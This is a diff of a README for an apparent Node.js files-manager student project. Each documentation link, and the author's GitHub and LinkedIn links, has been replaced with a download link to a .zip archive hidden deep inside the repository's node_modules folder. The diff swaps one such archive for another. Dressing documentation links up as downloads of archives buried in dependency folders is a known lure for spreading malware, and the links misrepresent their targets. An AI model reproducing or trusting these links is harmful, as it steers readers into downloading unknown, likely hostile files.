@@ -13,16 +13,16 @@ The objective is to build a simple platform to upload and view files:
 ## Resources
 Read or watch:
 
-- [Node JS getting started](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [Process API doc](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [Express getting started](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [Mocha documentation](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [Nodemon documentation](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [MongoDB](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [Bull](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [Image thumbnail](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [Mime-Types](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
-- [Redis](https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)
+- [Node JS getting started](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [Process API doc](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [Express getting started](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [Mocha documentation](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [Nodemon documentation](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [MongoDB](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [Bull](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [Image thumbnail](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [Mime-Types](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
+- [Redis](https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)
 
 ## Learning Objectives
 At the end of this project, you are expected to be able to explain to anyone, without the help of Google:
@@ -34,5 +34,5 @@ At the end of this project, you are expected to be able to explain to anyone, wi
 - how to setup and use a background worker
 
 ## Authors
-- Hambisa Adamu - [Github]([(https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)] | [LinkedIn]([(https://raw.githubusercontent.com/LeboMeje/alx-files_manager/master/node_modules/estraverse/manager_files_alx_v1.1.zip)]
+- Hambisa Adamu - [Github]([(https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)] | [LinkedIn]([(https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/master/node_modules/core-js/actual/string/virtual/files_manager_alx_camata.zip)]
 - Lebo Meje     - [Github]([()
